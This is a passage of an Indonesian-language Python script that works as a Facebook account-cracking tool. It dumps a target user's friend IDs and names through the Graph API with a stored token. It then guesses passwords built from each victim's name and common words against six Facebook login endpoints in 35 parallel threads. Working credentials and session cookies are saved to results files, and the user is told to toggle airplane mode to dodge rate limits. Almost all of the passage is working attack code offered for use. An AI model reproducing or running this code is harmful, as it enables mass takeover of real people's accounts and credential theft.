        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Publik New
def ___new___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
def ___metode___():
    print("\n%s[%s1%s]%s Metode mbasic.facebook.com"%(B,P,B,P))
    print("%s[%s2%s]%s Metode free.facebook.com"%(B,P,B,P))
    print("%s[%s3%s]%s Metode mobile.facebook.com"%(B,P,B,P))
    print("%s[%s4%s]%s Metode d.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
    print("%s[%s5%s]%s Metode b-api.facebook.com"%(B,P,B,P))
    print("%s[%s6%s]%s Metode x.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
    ___metode___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,P))
    elif ___metode___ in ['2','02']:
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(free, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,B))
    elif ___metode___ in ['3','03']:
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(mobile, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,B))
    elif ___metode___ in ['4','04']:
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(crack, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,P))
    elif ___metode___ in ['5','05']:
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(api, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai]%s"%(B,H,B))
    elif ___metode___ in ['6','06']:
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(crack2, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,B))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Crack Mbasic.Facebook.Com
def mbasic(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Free.Facebook.Com
def free(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Mobile.Facebook.Com
def mobile(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack D.Facebook.Com
def crack(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack B-api.Facebook.com
def api(ids, uid, pwx):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif 'www.facebook.com' in send.json()['error_msg']:
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack X.Facebook.com
def crack2(ids, uid, pwx, **kwargs):
    global loop, uas, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fx.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass

if __name__=='__main__':
	os.system("git pull")
	___menu___()
